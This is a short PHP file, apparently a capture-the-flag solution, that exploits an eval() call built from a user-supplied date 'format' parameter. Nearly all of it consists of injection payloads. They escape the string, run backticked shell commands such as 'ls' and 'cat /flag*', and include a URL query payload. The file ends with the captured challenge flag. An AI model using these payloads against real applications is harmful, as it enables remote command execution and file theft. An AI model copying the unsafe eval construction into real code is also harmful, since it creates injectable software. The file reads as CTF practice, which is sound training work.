<?php
#phpinfo();
#eval("\$x=`ls`;print \$x;");
eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
eval('$time = date("' . 'r",strtotime("+1 day +1 hour +1 minute +1 second")); $x=`ls`;print $x; date("r' . '", strtotime("' . "+1 day +1 hour +1 minute +1 second" . '"));');

#r",strtotime("+1 day +1 hour +1 minute +1 second")); $x=`ls`;print $x; date("r
#r",strtotime("+1 day +1 hour +1 minute +1 second")); $x=`ls /`;print $x; date("r
#r",strtotime("+1 day +1 hour +1 minute +1 second")); $x=`cat /flag*`;print $x; date("r

#?format=r",strtotime("+1 day +1 hour +1 minute +1 second")); $x=`cat /flag*`;print $x; date("r
#?format=${print(`cat /flag*`)}

#HTB{3v4l_h4s_put_y0ur_3v1l_pl4ns_und3r!}
?>
